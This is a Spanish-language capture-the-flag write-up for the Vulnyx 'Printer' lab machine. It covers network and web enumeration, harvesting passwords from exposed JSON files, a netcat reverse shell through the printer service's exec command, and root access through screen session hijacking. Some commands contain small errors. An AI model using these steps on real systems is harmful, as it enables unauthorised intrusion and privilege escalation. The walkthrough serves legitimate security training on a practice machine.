@@ -1,0 +1,155 @@
+---
+layout: post
+title: "Printer"
+date: 2024-04-30 13:20:23
+category: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Printer </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link OVA:</strong><a href="https://vulnyx.com/#printer"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/vulnyx/printer/host.png){:.margin}
+
+**1\.** Listamos dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/vulnyx/printer/arp.png){:.margin}
+
+**2\.** Escaneamos puertos y servicios en la máquina Printer.
+
+`sudo nmap -p- --open -T5 -sS -sCV --min-rate=5000 -n -Pn 192.168.1.6 -oN report`
+
+![img](/notas/public/img/vulnyx/printer/nmap.png){:.margin}
+
+_\- El el servidor apache no tenemos nada, incluso fuzzeando no tenemos nada._
+
+**3\.** Tenemos servidor Abyss, intentamos acceder, pero nos pide una contraseña.
+
+`nc 192.168.1.6 9999`
+
+![img](/notas/public/img/vulnyx/printer/konica_panel.png){:.margin}
+
+**4\.** Hacemos fuzzing en busca de directorios; encontramos api.
+
+`gobuster dir -u http://192.168.1.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50`
+
+![img](/notas/public/img/vulnyx/printer/gobuster_api.png){:.margin}
+
+**5\.** Seguimos fuzzeando un poco más; tenemos directorio printers.
+
+`gobuster dir -u http://192.168.1.6/api/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt`
+
+![img](/notas/public/img/vulnyx/printer/gobuster_printers.png){:.margin}
+
+**6\.** Vemos que apuntando a esta ruta nos da un formato de búsqueda.
+
+`http://192.168.1.6/api/printers/`
+
+![img](/notas/public/img/vulnyx/printer/format_printer.png){:.margin}
+
+**7\.** Fuzzeamos el id y la extensión correspondiente; encontramos id validos en formato json.
+
+`wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,json,php,html,txt 'http://192.168.1.6/ api/printers/printerFUZZ.FUZ2Z'`
+
+![img](/notas/public/img/vulnyx/printer/wfuzz_id.png){:.margin}
+
+**8\.** Vamos viendo contraseñas en los archivos json con las ids que obtuvimos.
+
+`http://192.168.1.6/api/printers/printer1599.json`
+
+![img](/notas/public/img/vulnyx/printer/id_json.png){:.margin}
+
+**9\.** Probamos cada contraseña; asi obtenemos acceso.
+
+`nc 192.168.1.6 9999`
+
+![img](/notas/public/img/vulnyx/printer/konica_login.png){:.margin}
+
+**10\.** Vemos comandos disponibles.
+
+`?`
+
+![img](/notas/public/img/vulnyx/printer/konica_help.png){:.margin}
+
+_\- Tenemos exec que nos permite ejecutar un comando._
+
+**11\.** Probamos el ejemplo que nos da.
+
+`exec id`
+
+![img](/notas/public/img/vulnyx/printer/exec_id.png){:.margin}
+
+**12\.** Aprovechamos para obtener un reverse shell.
+
+
+_\- Primero nos ponemos en escucha._
+
+`sudo nc -nlvp`
+
+![img](/notas/public/img/vulnyx/printer/nc_listen.png){:.margin}
+
+_\- Obtenemos la shell._
+
+`exec nc -e /bin/bash 192.168.1.6 443`
+
+`id`
+
+`whoami`
+
+![img](/notas/public/img/vulnyx/printer/nc_connected.png){:.margin}
+
+**13\.** Ponemos la shell totalmente interactiva.
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+![img](/notas/public/img/vulnyx/printer/shell_interactive.png){:.margin}
+
+**14\.** Tratamos un poco los variables de entorno.
+
+`export TERM=xterm`
+
+`export SHELL=bash`
+
+![img](/notas/public/img/vulnyx/printer/export.png){:.margin}
+
+**15\.** Buscamos binarios sudoers; tenemos varios.
+
+`find / -type -perm -4000 2>/dev/null`
+
+![img](/notas/public/img/vulnyx/printer/find.png){:.margin}
+
+**16\.** Buscando info de cada binario, usaremos el binario [screen](https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation#secuestro-de-sesiones-de-pantalla) para escalar privilegios.
+
+`screen -x root/`
+
+_\- Ya somos usuario root._
+
+**17\.** Finalizo obteniendo la flag de root :) .
+
+`ls`
+
+`cat root.txt`
+
+![img](/notas/public/img/vulnyx/printer/flag.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
